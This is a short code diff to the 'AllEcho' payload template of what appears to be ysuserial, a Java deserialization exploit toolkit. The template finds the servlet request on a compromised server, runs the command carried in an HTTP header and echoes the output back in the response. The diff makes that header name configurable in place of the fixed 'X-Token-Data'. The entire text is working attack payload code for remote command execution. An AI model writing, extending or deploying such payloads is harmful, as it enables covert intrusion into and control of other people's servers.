@@ -5,6 +5,8 @@ package org.su18.ysuserial.payloads.templates.echo;
  */
 public class AllEcho {
 
+	public static String CMD_HEADER;
+
 	public static java.util.HashSet<Object> h = new java.util.HashSet<Object>();
 
 	public static javax.servlet.http.HttpServletRequest r = null;
@@ -58,7 +60,7 @@ public class AllEcho {
 		if (!i(o)) {
 			if (r == null && javax.servlet.http.HttpServletRequest.class.isAssignableFrom(o.getClass())) {
 				r = (javax.servlet.http.HttpServletRequest) o;
-				if (r.getHeader("X-Token-Data") == null) {
+				if (r.getHeader(CMD_HEADER) == null) {
 					r = null;
 				} else {
 					try {
@@ -71,7 +73,7 @@ public class AllEcho {
 			if (r != null && p != null) {
 				try {
 					try {
-						p.getWriter().println(q(r.getHeader("X-Token-Data")));
+						p.getWriter().println(q(r.getHeader(CMD_HEADER)));
 					} catch (Exception ignored) {
 					}
 					p.getWriter().flush();
